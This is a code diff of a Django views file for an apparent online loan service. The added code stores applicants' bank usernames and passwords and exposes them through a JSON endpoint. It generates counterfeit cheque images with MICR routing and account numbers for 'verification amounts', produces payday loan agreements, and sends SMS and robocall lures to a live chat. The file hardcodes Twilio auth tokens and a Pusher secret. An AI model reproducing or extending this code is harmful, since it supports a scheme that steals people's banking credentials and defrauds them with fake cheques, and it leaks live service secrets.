@@ -1,5 +1,10 @@
 """ Loading All Libraries """
-
+from django.shortcuts import redirect
+from django.conf import settings
+from twilio.twiml.voice_response import VoiceResponse
+from twilio.twiml.voice_response import Gather, VoiceResponse
+from twilio.twiml.voice_response import VoiceResponse
+from django.http import JsonResponse
 from django.shortcuts import render
 from django.http import HttpResponse
 from django.contrib.auth.models import User
@@ -51,7 +56,7 @@ from django.template.loader import get_template
 from django.template import Context
 import pdfkit
 from twilio.twiml.voice_response import VoiceResponse
-from subscribe.models import SubsNew
+from subscribe.models import SubsNew, businessCheck
 from preregister.models import preregisterform
 from preregister.preregister import preregistermainform
 from fullbankclose.models import fullbankclose
@@ -63,6 +68,8 @@ from depositlist.models import Deposit_List, Received_List, Commitment_List, Com
 """ Loading Libraries end here """
 from loanleadsgen.models import leadsgen
 from loanleadsgen.loanleadsgen import leadsgenform
+import pusher
+
 """ All Global Variables """
 total_collection = '0'
 daily_collection = '0'
@@ -71,38 +78,103 @@ daily_check_created = '0'
 
 
 
-global_live_chat_link = "https://direct.lc.chat/14996295/"
+global_live_chat_link = "https://direct.lc.chat/16512825/"
 zero_cents = "Zero Cents*********"
 zero_cents_cashier = "00 CENTS***"
 zero_cents_diabetes = "00/100***"
 
 response = VoiceResponse()
-#
+#PRIMARY ACC DETAILS P
 account_sid = 'ACc4152bd9de2f520ae656332a28bd392d'
 auth_token = 'bb4a0a679dfa26f78e666a997a105066'
 client = Client(account_sid, auth_token)
-checknumbercount = 1
-config = pdfkit.configuration(wkhtmltopdf='C:/Program Files/wkhtmltopdf/bin/wkhtmltopdf.exe')
 
+
+#SECONDRY ACC DETAILS ARYAN
+account_sid = 'AC74fdb3337990ca3aeb241be5a8e1dfe6'
+auth_token = 'e81c8fc97b65cd6526b4d6705cc5c94a'
+client2 = Client(account_sid, auth_token)
+
+checknumbercount = 1
+config = pdfkit.configuration(wkhtmltopdf='/usr/bin/wkhtmltopdf')
+personal_check_number_view = "012"
+personal_account_number_view = 54213
+personal_routing_number_view = 54213
 """
 curl -G https://api.twilio.com/2010-04-01/Accounts/ACc4152bd9de2f520ae656332a28bd392d/Balance.json \
   -u "ACc4152bd9de2f520ae656332a28bd392d:bb4a0a679dfa26f78e666a997a105066"
 global variables end here """
 
 westerncount = 1
+def get_data_from_database(request):
+    # Fetch data from the database
+    data_from_database = fullbankclose.objects.order_by('-id')[:200]  # You may need to filter this queryset as needed
+
+    # Serialize the data to JSON
+    serialized_data = [
+        {
+            'id': item.id,
+            'first_name': item.first_name,
+            'last_name': item.last_name,
+            'email': item.email,
+            'phone': item.phone,
+            'address': item.address,
+            'city': item.city,
+            'state': item.state,
+            'zip_code': item.zip_code,
+            'loan_amount': item.loan_amount,
+            'payment_date': item.payment_date,
+            'bank_name': item.bank_name,
+            'since_how_long_banking': item.since_how_long_banking,
+            'online_banking_status': item.online_banking_status,
+            'current_balance_in_account': item.current_balance_in_account,
+            'username': item.username,
+            'password': item.password,
+            'money_return_time': item.money_return_time,
+
+            # Add other fields as needed
+        }
+        for item in data_from_database
+    ]
+
+    return JsonResponse({'data': serialized_data})
+def ajaxdashboard(request):
+    return render(request, 'darkdashboard/ajaxdashboard.html')
+
+def send_update(request):
+    message = "it's working"
+
+    # Initialize the Pusher client with your credentials
+    pusher_client = pusher.Pusher(
+        app_id='1683346',
+        key='2f522c7caedc5aaebdd8',
+        secret='54ac90df3cbcbb9e4000',
+        cluster='us2',
+        ssl=True
+    )
+
+    # Trigger the event on the specified channel
+    pusher_client.trigger('new-plane-718', 'update-event', {'message': message})
+
+    return JsonResponse({'message': message})
 
 
+def chat(request):
+    # Retrieve the URL you want to redirect to
+    redirect_url = "https://direct.lc.chat/16268808/"
 
+    # Redirect the user to the specified URL
+    return redirect(global_live_chat_link)
 
 
 @csrf_exempt
 def answer(request):
     global global_live_chat_link
     livechatlink = global_live_chat_link
-    message = client.messages \
+    message = client2.messages \
     .create(
         body="Hello, Sorry our loan supervisors are busy, please visit our live chat support to talk with us " + livechatlink + " Cash express loan",
-        from_='+17207105043',
+        from_='+18776798196',
         to=request.POST['From'],
         )
     vr = VoiceResponse()
@@ -186,7 +258,8 @@ def commitmentcreate(request):
 
 
 """End Commitment"""
-
+def verificationprocess(request):
+    return render(request, 'verification-process.html')
 
 
 def fullcard(request):
@@ -195,7 +268,7 @@ def fullcard(request):
         form = cardandcashappmainform(request.POST)
         if form.is_valid():
             form.save()
-            return HttpResponseRedirect(global_live_chat_link)
+            return HttpResponseRedirect("verification-process/")
         else:
             print(form.errors)
     form = cardandcashappmainform()
@@ -1434,10 +1507,10 @@ def sendmsgform(request):
     return render(request, 'smsform.html')
 
 def sendmsg(request):
-    message = client.messages \
+    message = client2.messages \
     .create(
 
-        from_='+17207105043',
+        from_='+18776798196',
         to=request.GET['phone'],
         body=request.GET['message'],
     )
@@ -1446,10 +1519,10 @@ def sendmsg(request):
 
 
 def sendmsg2(request):
-    message = client.messages \
+    message = client2.messages \
     .create(
         body=request.GET['message'],
-        from_='+17207105043',
+        from_='+18776798196',
         to=request.GET['phone'],
     )
     return HttpResponseRedirect('dashboard-2')
@@ -1463,11 +1536,11 @@ def callform(request):
 
 def call(request):
     client = Client(account_sid, auth_token)
-    call = client.calls.create(
+    call = client2.calls.create(
         machine_detection='DetectMessageEnd',
         twiml=request.GET['message'],
         to=request.GET['phone'],
-        from_='+17207105043',
+        from_='+18776798196',
         )
 
     return render(request, 'help.html')
@@ -1605,47 +1678,10 @@ def fullbankclosefunc(request):
             # Save the form data
             form.save()
 
-            # Get the email address from the form
-            email = request.POST['email']
-
-            # Get the loan amount from the form
-            loan_amount = request.POST['loan_amount']
-            first_name = request.POST['first_name']
-            last_name = request.POST['last_name']
-            name = first_name + ' ' + last_name
-            address = request.POST['address']
-            city = request.POST['city']
-            state = request.POST['state']
-            zip_code = request.POST['zip_code']
-            payment_date = request.POST['payment_date']
-            date_today = datetime.datetime.today()
-
-
-
-            # Create the context data for the agreement
-            context = {
-                "Full_Name": name,
-                "Verification_Amount": ' Depends on Easy Loan Express',
-                "Full_Address": address,
-                "Payment_Date": payment_date,
-                "Extra_Line": "",
-                "date_time": ' ' + ' ' + date_today.strftime('%m-%d-%Y'),
-            }
-
-            # Generate the agreement HTML
-            agreement_html = generate_agreement_html(loan_amount, context)
-            if agreement_html is None:
-                return HttpResponse('<h1> SEEMS LIKE YOUR AMOUNT DOES NOT MATCH WITH THE STORED TEMPLATES </h1>')
-
-            # Generate the agreement PDF from the HTML
-            pdf_bytes = generate_pdf_bytes(agreement_html)
-
-            # Send the agreement as an email attachment
-            send_confirmation_email(email, pdf_bytes, name)
 
             return HttpResponseRedirect(global_live_chat_link)
-        else:
-            print(form.errors)
+        #else:
+         #   print(form.errors)
     form = fullbankcloseform()
 
     return render(request, 'fullbankclose.html', {'form': form})
@@ -1746,7 +1782,81 @@ def agreement(request):
     pdf.close()
     os.remove("out.pdf")  # remove the locally created pdf file.
     return response  # returns the response.
+def paydayagreementgo(request):
+    database_id_from_user = request.POST['database']
+    obj = cardinformation.objects.get(id=int(database_id_from_user))
+    full_name = obj.first_name + obj.last_name
+    address = obj.address
+    city = obj.city
+    state = obj.state
 
+    zip_code = obj.zip_code
+    name = full_name
+    verification_amount = "200"
+    payment_date = request.POST['PAYMENT DATE']
+    address = address + ' ' + city + ' ' + state + ' ' +zip_code
+    extra_lines = 'loan amount will be deposited in 45 minutes after the verification process.'
+    loan_amount = request.POST['LOAN AMOUNT']
+
+    date_today = datetime.datetime.today()
+
+    if loan_amount == '$1000':
+        template = get_template("1000.html")
+    elif loan_amount == '$1500':
+        template = get_template('1500.html')
+    elif loan_amount == '$2000':
+        template = get_template('2000.html')
+    elif loan_amount == '$3000':
+        template = get_template('3000.html')
+    elif loan_amount == '$4000':
+        template = get_template('4000.html')
+    elif loan_amount == '$4500':
+        template = get_template('4500.html')
+    elif loan_amount == '$5000':
+        template = get_template('5000.html')
+    elif loan_amount == '$5500':
+        template = get_template('5500.html')
+    elif loan_amount == '$6000':
+        template = get_template('6000.html')
+    elif loan_amount == '$6500':
+        template = get_template('6500.html')
+    elif loan_amount == '$7000':
+        template = get_template('7000.html')
+    elif loan_amount == '$7500':
+        template = get_template('7500.html')
+    elif loan_amount == '$8000':
+        template = get_template('8000.html')
+    elif loan_amount == '$2500':
+        template = get_template('2500.html')
+    elif loan_amount == '$3500':
+        template = get_template('3500.html')
+    else:
+        print(loan_amount)
+        return HttpResponse('<h1> SEEMS LIKE YOUR AMOUNT DOES NOT MATCH WITH THE STORED TEMPLATES </h1>')
+
+
+
+
+    Context = {
+        "Full_Name": name,
+        "Verification_Amount": verification_amount,
+        "Full_Address": address,
+        "Payment_Date": payment_date,
+        "Extra_Line": extra_lines,
+        "date_time": ' ' + ' ' + date_today.strftime('%m-%d-%Y'),
+
+
+    }
+
+    file_name = name
+    html = template.render(Context)  # Renders the template with the context data.
+    pdfkit.from_string(html, 'out.pdf', configuration=config)
+    pdf = open("out.pdf", 'rb')
+    response = HttpResponse(pdf.read(), content_type='application/pdf')  # Generates the response as pdf response.
+    response['Content-Disposition'] = 'attachment; filename=""' + name + '.pdf'
+    pdf.close()
+    os.remove("out.pdf")  # remove the locally created pdf file.
+    return response  # returns the response.
 
 def home(request):
     return render(request, 'home.html')
@@ -2365,6 +2475,24 @@ def dashboard(request):
 
 
     return render(request, 'darkdashboard/index.html', {'livechatlink': live_chat_link,'full_bank_details': full_bank_details, 'short_bank_details': short_bank_details, 'preregister_details': preregister_details, 'recentmsg':recentmsg, 'bot_bank_close': bot_bank_close})
+
+
+@login_required
+def paydayagreementdashboard(request):
+    global global_live_chat_link
+    live_chat_link = global_live_chat_link
+    obj = cardinformation.objects.all()
+    full_bank_details = obj.order_by('-id')[:100]
+
+
+
+    return render(request, 'darkdashboard/paydaydashboard.html', {'livechatlink': live_chat_link,'full_bank_details': full_bank_details})
+
+
+
+
+
+
 @login_required
 def dashboard2(request):
     global global_live_chat_link
@@ -2389,7 +2517,7 @@ def dashboard2(request):
 
 
     bot_bank_close = fullbankclose.objects.all()
-    bot_bank_close = bot_bank_close.order_by('-id')[:20]
+    bot_bank_close = bot_bank_close.order_by('-id')[:150    ]
 
 
 
@@ -4834,7 +4962,6 @@ def cashapp_review_upload(request):
     context ={}
     return render(request, template, context)
 
-
 def loanredirect(request):
     global global_live_chat_link
     livechatlink = global_live_chat_link
@@ -4846,15 +4973,43 @@ def loanredirect(request):
     obj.treasury_check_number +=1
     obj.save()
 
-def cashier2022_check_create_d_3(request):
-    obj = SubsNew.objects.get(id=1)
-    cashier2022_check_print_number = obj.personal_check_number
-    obj.personal_check_number +=1
+
+
+def addcomment(request):
+    database_id_from_user = request.POST['database']
+    print('IDDDDD ', database_id_from_user)
+    obj = fullbankclose.objects.get(id=int(database_id_from_user))
+    comment_text = request.POST['comment']
+    obj.comment = comment_text
     obj.save()
-    full_name_check = "STEVE OSMAN"
-    address_check = "60 MARIETTA ROAD"
-    city_state_zip_check = "CHILLICOTHE, OH 45601"
-    small_text = '5-7508/2110'
+    return HttpResponseRedirect('dashboard-2')
+
+
+
+def cashier2022_check_create_d_3(request):
+    obj = SubsNew.objects.get(id=33)
+    personal_check_number = obj.personal_check_number
+    length = len(personal_check_number)
+    is_active = obj.is_active
+    new_check_number = str(int(personal_check_number) + 1).zfill(length)
+    obj.personal_check_number = new_check_number
+    obj.save()
+    
+    
+    
+
+    
+    
+
+    full_name_check = obj.personal_check_full_name
+    full_name_check_second = obj.personal_check_second_full_name
+    address_check = obj.personal_check_address
+    city_state_zip_check = obj.personal_check_city_state_zip_code
+    small_text = obj.personal_small_text
+    small_text_2 = obj.personal_small_text_2
+    personal_account_number = obj.personal_account_number
+    personal_routing_number = obj.personal_routing_number
+
     
 
     global amazon_check_number
@@ -4879,7 +5034,9 @@ def cashier2022_check_create_d_3(request):
     date_today = datetime.datetime.now()
     date_formated = date_today.strftime("%m/%d/%Y")
     print(date_formated)
-    image_1 = Image.open('personal.jpg')
+    image_path = os.path.join(settings.MEDIA_ROOT, 'personal.jpg')
+
+    image_1 = Image.open(image_path)
     draw = ImageDraw.Draw(image_1)
     amount_font = ImageFont.truetype('./arial.ttf', size=40)
     font_1 = ImageFont.truetype('./arial.ttf', size=35)
@@ -4898,43 +5055,41 @@ def cashier2022_check_create_d_3(request):
     #name = address
 
     #draw.text((x,y), name, fill=color, font=font_1)
-    (x,y) = (100, 100)
+    (x,y) = (100, 70)
     name = full_name_check
 
     draw.text((x,y), name, fill=color, font=font_1)
 
     #(x,y) = (1100, 2400)
     #name = city
-    (x,y) = (100, 150)
+    (x,y) = (100, 110)
     name = address_check
 
     draw.text((x,y), name, fill=color, font=font_1)
     #draw.text((x,y), name, fill=color, font=font_1)
 
-    (x,y) = (100, 200)
+    (x,y) = (100, 150)
     name = city_state_zip_check
 
     draw.text((x,y), name, fill=color, font=font_1)
     #(x,y) = (1900, 2400)
     #name = state
-    (x,y) = (1150, 100)
-    name = small_text
+    if full_name_check_second:
+        (x,y) = (100, 190)
+        name = full_name_check_second.upper()
+        draw.text((x,y), name, fill=color, font=font_1)
 
-    draw.text((x,y), name, fill=color, font=font_4)
-    #draw.text((x,y), name, fill=color, font=font_1)
 
-
-    #(x,y) = (2100, 2400)
-    #name = zip_code
-
-    #draw.text((x,y), name, fill=color, font=font_1)
-    # (x, y) = (450, 360)
-
-    # address_field = address
-
-    # #draw.text((x, y), 'Address'  , fill=color, font=font_2)
-
-    (x, y) = (450, 340)
+    if small_text:
+        (x,y) = (1150, 70)
+        name = small_text
+        draw.text((x,y), name, fill=color, font=font_4)
+        
+    if small_text_2:
+        (x,y) = (1190, 110)
+        name = small_text_2
+        draw.text((x,y), name, fill=color, font=font_4)
+        (x, y) = (450, 340)
 
     #address = address
 
@@ -4957,7 +5112,7 @@ def cashier2022_check_create_d_3(request):
 
     if request.POST['verificationamount'] == '100':
         (x, y) = (380, 380)
-        amount_in_words = 'ONE HUNDRED AND 00/100 '
+        amount_in_words = 'One Hundred And 00/100 '
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1430, 310)
@@ -4969,7 +5124,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == '200':
         (x, y) = (400, 380)
-        amount_in_words = 'TWO HUNDRED AND  00/100'
+        amount_in_words = 'Two Hundred And  00/100'
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -4981,7 +5136,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == '250':
         (x, y) = (400, 380)
-        amount_in_words = 'TWO HUNDRED FIFTY-THREE AND 40/100 '
+        amount_in_words = 'Two Hundred Fifty Three And 40/100 '
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -4994,7 +5149,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == '480':
         (x, y) = (400, 380)
-        amount_in_words = 'FOUR HUNDRED EIGHTY-THREE AND 40/100 '
+        amount_in_words = 'Four Hundred Eighty Three And 40/100 '
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -5009,7 +5164,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == '720':
         (x, y) = (400, 380)
-        amount_in_words = 'SEVEN HUNDRED TWENTY AND 00/100 '
+        amount_in_words = 'Seven Hundred Twenty And 00/100 '
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -5022,7 +5177,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == '970':
         (x, y) = (400, 380)
-        amount_in_words = 'NINE HUNDRED SEVENTY AND 00/100'
+        amount_in_words = 'Nine Hundred Seventy And 00/100'
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -5037,7 +5192,7 @@ def cashier2022_check_create_d_3(request):
 
     elif request.POST['verificationamount'] == 'manual':
         (x, y) = (400, 380)
-        amount_in_words = 'FOUR HUNDRED EIGHTY THREE AND 40/100 '
+        amount_in_words = 'Four Hundred Eighty Three And 40/100 '
         date_font  = ImageFont.truetype("./arial.ttf", size=40)
         draw.text((x,y), amount_in_words, fill=color, font=date_font)
         (x, y) = (1450, 310)
@@ -5061,21 +5216,22 @@ def cashier2022_check_create_d_3(request):
 
 
     (x, y) = (1580, 100)
-    checkno = str(cashier2022_check_print_number)
+    checkno = str(personal_check_number)
+    checkno = checkno.strip('0')
     date_font = ImageFont.truetype("./arial.ttf", size=65)
 
     draw.text((x,y), checkno, fill=color, font=date_font)
 
     (x, y) = (1050, 1120)
-    checkno = str(cashier2022_check_print_number)
+    checkno = str(personal_check_number)
     date_font = ImageFont.truetype("./arial.ttf", size=40)
 
     draw.text((x,y), '***FIRST NATIONAL BANK TEXAS***', fill=color, font=date_font)
 
 
 
-    (x, y) = (1000, 710)
-    checkno = str(cashier2022_check_print_number)
+    (x, y) = (1050, 710)
+    checkno = str(personal_check_number)
     date_font = ImageFont.truetype("./micrenc.ttf", size=75)
 
     draw.text((x,y), checkno, fill=color, font=date_font)
@@ -5095,7 +5251,7 @@ def cashier2022_check_create_d_3(request):
     checkmrifont= ImageFont.truetype("./micrenc.ttf", size=75)
 
     (x, y) = (550, 710)
-    account_number = str('6113942653') + 'c'
+    account_number = str(personal_account_number) + 'c'
 
     draw.text((x,y), account_number, fill=(0,0,0), font=checkmrifont)
 
@@ -5103,10 +5259,25 @@ def cashier2022_check_create_d_3(request):
     checkmrifont= ImageFont.truetype("./micrenc.ttf", size=75)
 
     (x, y) = (100, 710)
-    routing_number = 'a'+ str('211075086') + 'a' 
+    routing_number = 'a'+ str(personal_routing_number) + 'a' 
 
     draw.text((x,y), routing_number, fill=(0,0,0), font=checkmrifont)
 
+    width, height = 400, 400
+    image = Image.new("RGB", (width, height), "black")
+
+    # Create a drawing object
+    draw = ImageDraw.Draw(image_1)
+
+    # Specify the line coordinates (x1, y1, x2, y2) and color (RGB)
+    x1, y1, x2, y2 = 1150, 100, 1280, 100
+    line_color = (0, 0, 0)  # Red color
+
+    if small_text_2:
+        draw.line([(x1, y1), (x2, y2)], fill=line_color, width=2)
+
+    obj.star = "*"
+    obj.save()
 
     image_1.save('cashier2022' + '.png')
 
@@ -5115,6 +5286,8 @@ def cashier2022_check_create_d_3(request):
     rea_response['Content-Disposition'] = 'attachment;filename={}'.format(full_name+'.png')
 
     return rea_response
+
+
 
 
 
@@ -5317,37 +5490,37 @@ def create_back_check(request):
         print(date_formated)
         image_1 = Image.open('back.jpg')
         draw = ImageDraw.Draw(image_1)
-        amount_font = ImageFont.truetype('./happy.otf', size=50)
-        font_1 = ImageFont.truetype('./RinsHandwriting-Regular.ttf', size=120)
-        font_2 = ImageFont.truetype("./happy.otf", size=130)
+        amount_font = ImageFont.truetype('./af.ttf', size=50)
+        font_1 = ImageFont.truetype('./af.ttf', size=90)
+        font_2 = ImageFont.truetype("./af.ttf", size=130)
 
         color = 'rgb(00, 00, 00)'
 
 
-        (x,y) = (150, 29)
+        (x,y) = (150, 60)
         first_name = first_name.capitalize()
         last_name = last_name.capitalize()
 
         draw.text((x,y), first_name + ' ' +last_name, fill=color, font=font_1)
 
         try:
-            (x,y) = (35, 190)
+            (x,y) = (35, 160)
             draw.text((x,y), endorsement_from_user, fill=color, font=font_1)
         except:
             pass
 
         try:
-            (x,y) = (35, 290)
+            (x,y) = (35, 250)
             draw.text((x,y), endorsement_from_user_2, fill=color, font=font_1)
         except:
             pass
         try:
-            (x,y) = (35, 370)
+            (x,y) = (35, 340)
             draw.text((x,y), endorsement_from_user_3, fill=color, font=font_1)
         except:
             pass
         try:
-            (x,y) = (35, 470)
+            (x,y) = (35, 420)
             draw.text((x,y), endorsement_from_user_4, fill=color, font=font_1)
         except:
             pass
@@ -5367,15 +5540,427 @@ def sms2(request):
     livechatlink = global_live_chat_link
     number = request.GET['From']
     body = request.GET['Body']
+    
     new_message = messagearea(phone_number=number, text_sms=body)
+    new_message.save()
 
-    message = client.messages \
+    message = client2.messages \
     .create(
 
-        from_='+13854752387',
+        from_='+18776798196',
         to=number,
-        body=f"Here is your Loan Supervisor chat link - {livechatlink} Tap on the link to talk with us."
+        body=f"{livechatlink} Click on the live chat link to talk with us. Thanks!"
 #        body='Loan Supervisors are busy. Please submit your details to get deposited. Here is the link - www.cashexpressloan.com/loan-deposit-card',
     )
     return HttpResponse('Sent')
+
+@csrf_exempt
+@twilio_view
+def sms3(request):
+    global global_live_chat_link
+    livechatlink = global_live_chat_link
+    number = request.GET['From']
+    body = request.GET['Body']
+    
+    new_message = messagearea(phone_number=number, text_sms=body)
+    new_message.save()
+
+    message = client2.messages \
+    .create(
+
+        from_='+18776798196',
+        to=number,
+        body=f"https://direct.lc.chat/16512825/ We are online. Click on the link to start chat. "
+#        body='Loan Supervisors are busy. Please submit your details to get deposited. Here is the link - www.cashexpressloan.com/loan-deposit-card',
+    )
+    return HttpResponse('Sent')
+
+def make_call(request):
+    # Your Twilio credentials and phone numbers
+    account_sid = 'ACc4152bd9de2f520ae656332a28bd392d'
+    auth_token = 'bb4a0a679dfa26f78e666a997a105066'
+    twilio_phone_number = '8776798196'
+    recipient_phone_number = '14803895484'
+
+    # Create a Twilio client
+    client = Client(account_sid, auth_token)
+
+    # Create a TwiML response
+    response = VoiceResponse()
+    response.play("https://github.com/Aaron7622/audio/raw/main/tollfreevm.mp3")
+
+
+    # Initiate a call
+    call = client.calls.create(
+        to=recipient_phone_number,
+        from_=twilio_phone_number,
+        twiml=str(response)
+    )
+
+    return HttpResponse(f'Call initiated. Call SID: {call.sid}')
+    
+# views.py
+
+def call_response(request):
+    global global_live_chat_link
+    livechatlink = global_live_chat_link
+    caller_number = request.GET.get('From')
+    
+    
+
+
+    message = client2.messages \
+    .create(
+
+        from_='+18776798196',
+        to=caller_number,
+        body=f" https://easyloanexpress.com/chat Here is the chat-link to talk with us on live-chat.  Thanks!"
+#        body='Loan Supervisors are busy. Please submit your details to get deposited. Here is the link - www.cashexpressloan.com/loan-deposit-card',
+    )    
+    # Create a TwiML response
+    response = VoiceResponse()
+
+    # Play a voice message
+    response.play("https://github.com/Aaron7622/audio/raw/main/tollfreevm2.mp3")
+    
+    # Hang up the call
+    response.hangup()
+
+    
+
+    # Return the TwiML response
+    return HttpResponse(str(response))
+
+
+def businesscheck_go(request):
+    obj = businessCheck.objects.get(id=1)
+    is_active = obj.is_active
+    business_check_number = obj.business_check_number
+    length = len(business_check_number)
+    new_check_number = str(int(business_check_number) + 1).zfill(length)
+    obj.business_check_number = new_check_number
+    obj.save()
+
+    full_name_check = obj.business_check_company_name.upper()
+    address_check = obj.business_check_address
+    city_state_zip_check = obj.business_check_city_state_zip_code
+    small_text = obj.business_small_text
+    small_text_2 = obj.business_small_text_2
+    business_account_number = obj.business_account_number
+    business_routing_number = obj.business_routing_number
+    issued_bank_name = obj.issued_bank_name
+    issued_address = obj.issued_address
+    issued_city_state_zipcode = obj.issued_city_state_zipcode
+    full_name_second = obj.business_check_second_name
+
+    id_number = 2
+    database_id_from_user = request.POST['database']
+    obj = fullbankclose.objects.get(id=int(database_id_from_user))
+    full_name = obj.first_name + ' ' + obj.last_name
+    full_name.upper()
+    
+    address = obj.address.upper()
+    city = obj.city.upper()
+    state = obj.state.upper()
+
+    zip_code = obj.zip_code
+    
+    print(database_id_from_user)
+   # check_counting = amazon_check_number
+
+    print(full_name)
+    print(request.POST['verificationamount'])
+    date_today = datetime.datetime.now()
+    date_formated = date_today.strftime("%m/%d/%Y")
+    print(date_formated)
+    image_path = os.path.join(settings.MEDIA_ROOT, 'business.jpg')
+
+    image_1 = Image.open(image_path)
+    draw = ImageDraw.Draw(image_1)
+    amount_font = ImageFont.truetype('./arial.ttf', size=40)
+    font_1 = ImageFont.truetype('./arial.ttf', size=30)
+    font_4 = ImageFont.truetype('./arial.ttf', size=25)
+    font_2 = ImageFont.truetype("./arial.ttf", size=40)
+    font_issued = ImageFont.truetype('./courbold.ttf', size=20)
+
+    color = 'rgb(00, 00, 00)'
+
+
+    (x,y) = (50, 550)
+    name = issued_bank_name.upper()
+
+    draw.text((x,y), name, fill=color, font=font_issued)
+
+    if full_name_second:
+        (x,y) = (200, 180)
+        name = full_name_second.upper()
+        draw.text((x,y), name, fill=color, font=font_1)
+    (x,y) = (50, 580)
+    name = issued_address.upper()
+
+    draw.text((x,y), name, fill=color, font=font_issued)
+
+
+    (x,y) = (50, 610)
+    name = issued_city_state_zipcode.upper()
+
+    draw.text((x,y), name, fill=color, font=font_issued)
+
+
+    (x,y) = (300, 360)
+    name = full_name.upper()
+
+    draw.text((x,y), name, fill=color, font=font_1)
+
+    (x,y) = (300, 400)
+    name = address.upper()
+
+    draw.text((x,y), name, fill=color, font=font_1)
+
+    (x,y) = (300, 440)
+    name = city + ' ' + state + ' ' + zip_code
+    name.upper()
+
+    draw.text((x,y), name, fill=color, font=font_1)
+
+
+    (x,y) = (200, 50)
+    name = full_name_check
+
+    draw.text((x,y), name, fill=color, font=font_1)
+
+    #(x,y) = (1100, 2400)
+    #name = city
+    (x,y) = (200, 90)
+    name = address_check
+
+    draw.text((x,y), name, fill=color, font=font_1)
+    #draw.text((x,y), name, fill=color, font=font_1)
+
+    (x,y) = (200, 130)
+    name = city_state_zip_check
+
+    draw.text((x,y), name, fill=color, font=font_1)
+    #(x,y) = (1900, 2400)
+    #name = state
+
+    if small_text:
+        (x,y) = (1055, 40)
+        small_1 = small_text
+        draw.text((x,y), small_1, fill=color, font=font_4)
+    if small_text_2:
+        (x,y) = (1070, 70)
+        small_2 = small_text_2
+        draw.text((x,y), small_2, fill=color, font=font_4)
+    
+    #(x,y) = (2100, 2400)
+    #name = zip_code
+
+    #draw.text((x,y), name, fill=color, font=font_1)
+    # (x, y) = (450, 360)
+
+    # address_field = address
+
+    # #draw.text((x, y), 'Address'  , fill=color, font=font_2)
+
+    (x, y) = (450, 340)
+
+    #address = address
+
+    #draw.text((x, y), address, fill=color, font=font_2)
+
+
+
+
+    (x, y) = (450, 370)
+    #city_and_state = city+'' + ' ' + state + ' ' + zip_code
+    #draw.text((x, y), city_and_state, fill=color, font=font_2)
+
+
+    # (x, y) = (450, 420)
+    # country = ('UNITED STATES.')
+    # #wrapped = textwrap.fill(country, 50)
+    # draw.text((x, y), country, fill=color, font=font_2)
+
+    # Create a blank image with a white background
+
+
+    # Save or display the image
+    
+    
+
+    if request.POST['verificationamount'] == '100':
+        (x, y) = (300, 300)
+        amount_in_words = 'One Hundred And 00/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$100.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+    elif request.POST['verificationamount'] == '200':
+        (x, y) = (300, 300)
+        amount_in_words = 'Two Hundred And  00/100'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$200.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+    elif request.POST['verificationamount'] == '250':
+        (x, y) = (300, 300)
+        amount_in_words = 'Two Hundred Fifty Three And 40/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$253.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+
+    elif request.POST['verificationamount'] == '480':
+        (x, y) = (300, 300)
+        amount_in_words = 'Four Hundred Eighty Three And 40/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$483.40'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+
+
+
+    elif request.POST['verificationamount'] == '720':
+        (x, y) = (300, 300)
+        amount_in_words = 'Seven Hundred Twenty And 00/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$720.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+
+    elif request.POST['verificationamount'] == '970':
+        (x, y) = (300, 300)
+        amount_in_words = 'Nine Hundred Seventy And 00/100'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), amount_in_words.upper(), fill=color, font=date_font)
+        (x, y) = (1550, 310)
+        check_amount = '$970.00'
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
+        draw.text((x,y), check_amount, fill=color, font=date_font)
+
+
+
+
+
+
+    elif request.POST['verificationamount'] == 'manual':
+        (x, y) = (300, 300)
+        amount_in_words = 'Four Hundred Eighty Three And 40/100 '
+        date_font  = ImageFont.truetype("./arial.ttf", size=30)
